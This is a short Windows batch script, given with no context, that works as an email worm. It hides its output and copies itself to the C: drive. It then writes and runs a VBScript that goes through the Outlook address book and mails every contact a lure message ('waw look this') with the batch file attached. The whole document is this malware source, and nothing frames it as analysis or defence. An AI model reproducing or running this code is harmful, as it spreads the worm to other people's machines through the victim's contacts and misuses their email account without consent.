   ctty nul
   copy %0 C:\mama.bat
   copy %0 C:\email.vbs
   echo Dim x > C:\email.vbs
   echo.on error resume next >> C:\email.vbs
   echo Set fso =" Scripting.FileSystem.Object" >> C:\email.vbs
   echo Set so=CreateObject(fso) >> C:\email.vbs
   echo Set ol=CreateObject("Outlook.Application") >> C:\email.vbs
   echo Set out= WScript.CreateObject("Outlook.Application") >> C:\email.vbs
   echo Set mapi = out.GetNameSpace("MAPI") >> C:\email.vbs
   echo Set a = mapi.AddressLists(1) >> C:\email.vbs
   echo For x=1 To a.AddressEntries.Count >> C:\email.vbs
   echo Set Mail=ol.CreateItem(0) >> C:\email.vbs
   echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >> C:\email.vbs
   echo Mail.Subject="halloy" >> C:\email.vbs
   echo Mail.Body="waw look this" >> C:\email.vbs
   echo Mail.Attachments.Add("C:\mama.bat") >> C:\email.vbs
   echo Mail.Send >> C:\email.vbs
   echo Next >> C:\email.vbs
   echo ol.Quit >> C:\email.vbs
   cscript C:\email.vbs
